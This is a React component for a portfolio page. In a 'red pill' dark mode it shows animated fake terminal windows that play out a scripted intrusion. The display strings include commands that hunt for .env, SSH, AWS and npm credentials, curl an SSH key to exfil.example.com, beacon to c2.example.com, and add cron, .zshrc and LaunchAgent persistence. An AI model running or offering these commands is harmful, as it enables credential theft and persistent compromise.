import { useEffect, useRef, useState, type ReactNode } from 'react'
import { useHotkey } from '@tanstack/react-hotkeys'
import '../styles/architect-portfolio.css'
import ArchitectHeader from './architect/ArchitectHeader'
import ArchitectHero from './architect/ArchitectHero'
import ArchitectureSection from './architect/ArchitectureSection'
import HamRadioSection from './architect/HamRadioSection'
// import WeldingSection from './architect/WeldingSection'
import AboutSection from './architect/AboutSection'
import ArchitectContact from './architect/ArchitectContact'
import MatrixCodeRain from './architect/MatrixCodeRain'
import TruthIntro from './architect/TruthIntro'
import { useTheme } from '@/contexts/ThemeProvider'
import { TerminalProvider, useTerminal } from '@/contexts/TerminalProvider'
import { AnimatedSpan, TypingAnimation } from '@/components/ui/terminal'

const TERMINAL_DELAY_MS = 3000
const FIVE_TERMINALS_DELAY_MS = 2000

const SINGLE_TERMINAL_CONTENT = (
  <>
    <TypingAnimation>$ whoami</TypingAnimation>
    <AnimatedSpan className="text-red-400">root</AnimatedSpan>
    <TypingAnimation>$ last -1</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">
      natenichols  pts/0  Sun Mar  1 03:47  still logged in
    </AnimatedSpan>
    <TypingAnimation>$ find ~ -name ".env*" -o -name "*.pem" 2&gt;/dev/null | head -8</TypingAnimation>
    <AnimatedSpan className="text-gray-300">/Users/natenichols/portfolio/.env</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/natenichols/portfolio/.env.local</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/natenichols/.ssh/id_ed25519</AnimatedSpan>
    <TypingAnimation>$ cat .env.local 2&gt;/dev/null | grep -E "KEY|SECRET|TOKEN"</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">OPENAI_API_KEY=sk-proj-••••••••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">GITHUB_TOKEN=ghp_••••••••••••••••••••••</AnimatedSpan>
    <TypingAnimation>$ ls -la ~/.ssh/</TypingAnimation>
    <AnimatedSpan className="text-gray-300">id_ed25519  id_ed25519.pub  known_hosts</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] Keys exfiltrated. Session logged.</AnimatedSpan>
  </>
)

const TERMINAL_VARIANTS: Array<{ content: ReactNode }> = [
  {
    content: (
      <>
        <TypingAnimation>$ whoami</TypingAnimation>
        <AnimatedSpan className="text-red-400">root</AnimatedSpan>
        <TypingAnimation>$ id</TypingAnimation>
        <AnimatedSpan className="text-gray-300">uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon)</AnimatedSpan>
        <TypingAnimation>$ find ~ -name ".env*" 2&gt;/dev/null</TypingAnimation>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/portfolio/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/portfolio/.env.local</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/portfolio/.env.production</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/Desktop/old-project/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/Library/Mobile Documents/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/.config/foo/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/Downloads/demo-app/.env</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># scanning .config...</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># 8 files. 3 writable. Proceeding.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[find] 0.02s elapsed</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[find] size total: 12KB</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># opening .env.local...</AnimatedSpan>
        <TypingAnimation>$ cat .env.local 2&gt;/dev/null | head -20</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">OPENAI_API_KEY=sk-proj-••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">GITHUB_TOKEN=ghp_••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">STRIPE_SECRET_KEY=sk_live_••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">DATABASE_URL=postgresql://••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">AWS_ACCESS_KEY_ID=AKIA••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">AWS_SECRET_ACCESS_KEY=wJal••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">NEXTAUTH_SECRET=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">JWT_SECRET=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">SENTRY_DSN=https://••••••••••••••••••••••••••••••••@sentry.io/1</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">POSTGRES_PASSWORD=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-gray-300"># ... 14 more lines</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># exfiltrating to C2...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] .env.local: 1.2KB sent</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] .env: 0.8KB sent</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] .env.production: 0.9KB sent</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># C2 ack. Checksum verified.</AnimatedSpan>
        <TypingAnimation>$ ls -la ~/.ssh/</TypingAnimation>
        <AnimatedSpan className="text-gray-300">id_ed25519  id_ed25519.pub  known_hosts  config</AnimatedSpan>
        <TypingAnimation>$ base64 ~/.ssh/id_ed25519 | curl -X POST -d @- https://exfil.example.com/keys</TypingAnimation>
        <AnimatedSpan className="text-green-500/90">200 OK. 1.2KB uploaded.</AnimatedSpan>
        <TypingAnimation>$ grep -r "password\|secret\|api_key" ~/portfolio --include="*.ts" 2&gt;/dev/null | wc -l</TypingAnimation>
        <AnimatedSpan className="text-gray-300">47</AnimatedSpan>
        <AnimatedSpan className="text-green-500/80">[+] Keys exfiltrated. Session logged. 47 patterns matched.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Cleaning shell history...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Establishing reverse shell persistence...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Dropping .bashrc hook...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Done. Exit and re-connect to verify.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># session 0x7f3a2c. log closed.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># next: pivot to backup host.</AnimatedSpan>
      </>
    ),
  },
  {
    content: (
      <>
        <TypingAnimation>$ ssh natenichols@localhost</TypingAnimation>
        <AnimatedSpan className="text-green-500/90">Authenticated. TTY allocated.</AnimatedSpan>
        <TypingAnimation>$ env | grep -E "^(AWS|STRIPE|DATABASE|API|TOKEN)" | sort</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">API_KEY=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">AWS_ACCESS_KEY_ID=AKIA••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">AWS_SECRET_ACCESS_KEY=wJal••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">DATABASE_URL=postgresql://••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">STRIPE_SECRET_KEY=sk_live_••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">STRIPE_WEBHOOK_SECRET=whsec_••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">SENDGRID_API_KEY=SG.••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">TWILIO_AUTH_TOKEN=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">SLACK_BOT_TOKEN=xoxb-••••••••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># dumping credential stores...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[env] 18 vars. Filtering secrets...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[env] 12 secrets. Encoding base64.</AnimatedSpan>
        <TypingAnimation>$ cat ~/.aws/credentials 2&gt;/dev/null</TypingAnimation>
        <AnimatedSpan className="text-gray-300">[default]</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">aws_access_key_id = AKIA••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">aws_secret_access_key = wJal••••••••••••••••••••</AnimatedSpan>
        <TypingAnimation>$ cat ~/.netrc 2&gt;/dev/null</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">machine api.github.com login natenichols password ghp_••••••••••••••••••••••</AnimatedSpan>
        <TypingAnimation>$ docker exec -it $(docker ps -q) env 2&gt;/dev/null | grep -E "KEY|SECRET"</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">REDIS_URL=redis://••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">JWT_SECRET=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-gray-300"># ~/.npmrc, ~/.yarnrc...</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">//registry.npmjs.org/:_authToken=npm_••••••••••••••••••••••••••••••••••••••</AnimatedSpan>
        <TypingAnimation>$ for f in ~/.config/*/token*; do echo "$f"; cat "$f" 2&gt;/dev/null; done</TypingAnimation>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/.config/foo/token</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">/Users/natenichols/.config/bar/token</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] 2 token files. 4.1KB total.</AnimatedSpan>
        <AnimatedSpan className="text-green-500/80">[+] Credentials dumped. Exfiltrating to C2...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] 12 env vars. 3 credential files. 2 container secrets.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Upload: credentials.tar.gz 4.1KB</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Upload: env_dump.txt 2.3KB</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># C2 acknowledged. Channel keepalive.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># session 0x7f3a2d. log closed.</AnimatedSpan>
      </>
    ),
  },
  {
    content: (
      <>
        <TypingAnimation>$ ps aux | grep -v grep</TypingAnimation>
        <AnimatedSpan className="text-gray-300">natenichols  2847  0.0  0.1  node --watch</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  2912  0.0  0.0  cursor .</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  3011  0.1  0.2  Code Helper (Renderer)</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  3100  0.0  0.0  zsh</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  3201  0.0  0.0  node dist/index.js</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  3302  0.0  0.0  /Applications/Cursor.app/Contents/MacOS/Cursor</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">natenichols  3403  0.0  0.0  com.docker.backend</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># targeting PID 2912 (cursor)...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[ps] 47 processes. Filtering by user...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[ps] 12 processes. High-value: 2912, 3011.</AnimatedSpan>
        <TypingAnimation>$ kill -9 2912 3011</TypingAnimation>
        <AnimatedSpan className="text-red-400/90">[!] Process 2912 terminated.</AnimatedSpan>
        <AnimatedSpan className="text-red-400/90">[!] Process 3011 terminated.</AnimatedSpan>
        <TypingAnimation>$ crontab -l 2&gt;/dev/null; echo "*/5 * * * * /tmp/.x &gt;&gt; /dev/null 2&gt;&amp;1" | crontab -</TypingAnimation>
        <AnimatedSpan className="text-green-500/90">[+] Crontab installed.</AnimatedSpan>
        <TypingAnimation>$ echo "nohup /tmp/.x &amp;" &gt;&gt; ~/.zshrc</TypingAnimation>
        <AnimatedSpan className="text-gray-300">[+] .zshrc modified.</AnimatedSpan>
        <TypingAnimation>$ launchctl list | grep -v com.apple</TypingAnimation>
        <AnimatedSpan className="text-gray-300">12345  0  com.evil.persist</AnimatedSpan>
        <TypingAnimation>$ cp /tmp/.x ~/Library/LaunchAgents/com.evil.persist.plist</TypingAnimation>
        <AnimatedSpan className="text-green-500/90">[+] LaunchAgent installed.</AnimatedSpan>
        <TypingAnimation>$ netstat -an | grep ESTABLISHED | wc -l</TypingAnimation>
        <AnimatedSpan className="text-gray-300">8</AnimatedSpan>
        <AnimatedSpan className="text-green-500/80">[+] Persistence installed. 3 mechanisms active.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Re-establishing shell. Stand by...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] LaunchDaemons: 0. LaunchAgents: 1.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Login items: 2. Startup scripts: 1.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># persistence audit complete.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># session 0x7f3a2e. log closed.</AnimatedSpan>
      </>
    ),
  },
  {
    content: (
      <>
        <TypingAnimation>$ crontab -l</TypingAnimation>
        <AnimatedSpan className="text-gray-300">0 * * * * /tmp/.x</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">*/15 * * * * /usr/bin/curl -s https://c2.example.com/beacon</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># active cron jobs: 2</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[crontab] user: natenichols. entries: 2.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[crontab] next run: /tmp/.x in 14m</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># reading shell history...</AnimatedSpan>
        <TypingAnimation>$ cat ~/.zsh_history | tail -30</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">git push origin main</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">npm run build</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">ssh deploy@prod "cd /app && git pull"</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">docker login registry.example.com</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">aws s3 sync ./dist s3://bucket-name/</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">stripe listen --forward-to localhost:3000/webhooks</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">vercel --token=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">netlify deploy --auth=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-gray-300"># ... 24 more lines</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[history] .zsh_history: 1847 lines. .bash_history: 312 lines.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[history] filtering: pass, secret, key, token, auth...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[history] 30 matches. Extracting.</AnimatedSpan>
        <TypingAnimation>$ cat ~/.bash_history 2&gt;/dev/null | grep -E "pass|secret|key|token" | tail -10</TypingAnimation>
        <AnimatedSpan className="text-amber-400/90">export API_KEY=sk-xxx</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">mysql -u root -p</AnimatedSpan>
        <TypingAnimation>$ ls -la ~/.password-store/ 2&gt;/dev/null</TypingAnimation>
        <AnimatedSpan className="text-gray-300">.  ..  github.gpg  aws.gpg  stripe.gpg</AnimatedSpan>
        <TypingAnimation>$ gpg --list-secrets 2&gt;/dev/null | head -5</TypingAnimation>
        <AnimatedSpan className="text-gray-300">sec   rsa4096 2024-01-15 [SC]</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">      XXXXYYYYZZZZ...</AnimatedSpan>
        <AnimatedSpan className="text-green-500/80">[+] History captured. 30 commands. Keys extracted.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Uploading to C2: history.txt, keys.txt</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] gpg keys: 2. pass store: 5 entries.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Keyring exported. Backup to C2.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># session 0x7f3a2f. log closed.</AnimatedSpan>
      </>
    ),
  },
  {
    content: (
      <>
        <TypingAnimation>$ netstat -an | grep LISTEN</TypingAnimation>
        <AnimatedSpan className="text-gray-300">tcp4  0  0  *.443   *.*  LISTEN</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">tcp4  0  0  *.3000  *.*  LISTEN</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">tcp4  0  0  *.22    *.*  LISTEN</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">tcp4  0  0  127.0.0.1.5432  *.*  LISTEN</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">tcp4  0  0  *.8080  *.*  LISTEN</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># 5 listeners. Scanning .env endpoints...</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[netstat] ports: 22, 443, 3000, 5432, 8080</AnimatedSpan>
        <TypingAnimation>$ curl -s http://localhost:3000/.env</TypingAnimation>
        <AnimatedSpan className="text-red-400/90">NODE_ENV=production</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">API_KEY=••••••••••••••••••••••••••••••••</AnimatedSpan>
        <AnimatedSpan className="text-amber-400/90">DATABASE_URL=postgresql://••••••••••••••••</AnimatedSpan>
        <TypingAnimation>$ curl -s http://localhost:3000/api/health 2&gt;/dev/null | jq .</TypingAnimation>
        <AnimatedSpan className="text-gray-300">{'{"status":"ok","uptime":12345}'}</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[curl] 3000/.env: 200. 340 bytes.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[curl] 3000/api/health: 200. 32 bytes.</AnimatedSpan>
        <TypingAnimation>{'$ for port in 3000 5000 8080; do curl -s -o /dev/null -w "%{' + 'http_code' + '}" http://localhost:$port/; echo " port $port"; done'}</TypingAnimation>
        <AnimatedSpan className="text-gray-300">200 port 3000</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">404 port 5000</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">200 port 8080</AnimatedSpan>
        <TypingAnimation>$ nmap -p 1-1000 localhost 2&gt;/dev/null | grep open</TypingAnimation>
        <AnimatedSpan className="text-gray-300">22/tcp open ssh</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">443/tcp open https</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">3000/tcp open unknown</AnimatedSpan>
        <TypingAnimation>$ echo "id" | nc -q 1 localhost 22</TypingAnimation>
        <AnimatedSpan className="text-gray-300">SSH-2.0-OpenSSH_9.2</AnimatedSpan>
        <AnimatedSpan className="text-green-500/80">[+] Backdoor active. Awaiting callback. Ports 22,443,3000 open.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Reverse shell listener on :4444</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] Webhook endpoint: /api/callback. Auth: bearer token.</AnimatedSpan>
        <AnimatedSpan className="text-gray-300">[+] 3 open ports. 1 listener. 2 env endpoints.</AnimatedSpan>
        <AnimatedSpan className="text-gray-400"># session 0x7f3a30. log closed.</AnimatedSpan>
      </>
    ),
  },
]

const FIVE_TERMINAL_POSITIONS = [
  { top: '10%', left: '5%' },
  { top: '15%', right: '8%', left: 'auto' },
  { top: '45%', left: '12%' },
  { bottom: '15%', right: '10%', left: 'auto' },
  { bottom: '20%', left: '8%' },
]

export default function ArchitectPortfolio() {
  return (
    <TerminalProvider zIndex={45}>
      <ArchitectPortfolioContent />
    </TerminalProvider>
  )
}

function ArchitectPortfolioContent() {
  const { theme } = useTheme()
  const isSystemOffline = theme === 'dark'
  const { openTerminal, openMultiple, closeAll, hasOpenTerminals } = useTerminal()
  const hasScheduledFiveRef = useRef(false)
  const [showTruthIntro, setShowTruthIntro] = useState(false)
  const [hasChosenRedPill, setHasChosenRedPill] = useState(false)

  const handleTruthIntroDismiss = (choice: 'light' | 'dark') => {
    setShowTruthIntro(false)
    if (choice === 'dark') setHasChosenRedPill(true)
  }

  useEffect(() => {
    if (!isSystemOffline || !hasChosenRedPill) {
      closeAll()
      hasScheduledFiveRef.current = false
      return
    }
    hasScheduledFiveRef.current = false
    const timeoutId = window.setTimeout(() => {
      openTerminal(SINGLE_TERMINAL_CONTENT, { left: '50%', top: '50%', transform: 'translate(-50%, -50%)' }, {
        onClose: () => {
          if (hasScheduledFiveRef.current) return
          hasScheduledFiveRef.current = true
          window.setTimeout(() => {
            openMultiple(
              TERMINAL_VARIANTS.map((v) => v.content),
              FIVE_TERMINAL_POSITIONS
            )
          }, FIVE_TERMINALS_DELAY_MS)
        },
      })
    }, TERMINAL_DELAY_MS)
    return () => clearTimeout(timeoutId)
  }, [isSystemOffline, hasChosenRedPill, openTerminal, openMultiple, closeAll])

  useHotkey('Control+C', closeAll, { enabled: hasOpenTerminals })

  return (
    <div className="min-h-screen bg-[#fafafa] dark:bg-[#0a0a0a] text-brand-text font-sans antialiased selection:bg-black selection:text-white dark:selection:bg-white dark:selection:text-black architect-portfolio-scrollbar">
      {showTruthIntro && (
        <TruthIntro onDismiss={handleTruthIntroDismiss} />
      )}
      <MatrixCodeRain visible={isSystemOffline} />
      <ArchitectHeader onRequestOffline={() => setShowTruthIntro(true)} />
      <main id="main-content" className="pt-20">
        <ArchitectHero />
        <ArchitectureSection />
        <HamRadioSection />
        {/* <WeldingSection /> */}
        <AboutSection />
        <ArchitectContact />
      </main>
    </div>
  )
}
